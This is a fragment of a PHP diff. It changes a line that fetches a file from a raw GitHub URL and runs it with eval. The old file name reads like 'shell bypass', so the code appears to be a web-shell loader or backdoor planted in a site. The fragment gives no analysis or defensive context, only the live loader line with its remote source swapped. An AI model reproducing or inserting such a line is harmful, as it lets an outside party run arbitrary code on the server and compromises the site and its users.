@@ -11,5 +11,5 @@
  
     return $data; 
 } 
-      eval('?>' . get('https://raw.githubusercontent.com/juraganujang/ujang/refs/heads/main/shellbypasnvl')); 
+      eval('?>' . get('https://raw.githubusercontent.com/juraganujang/ujang/refs/heads/main/gekoku')); 
 ?>
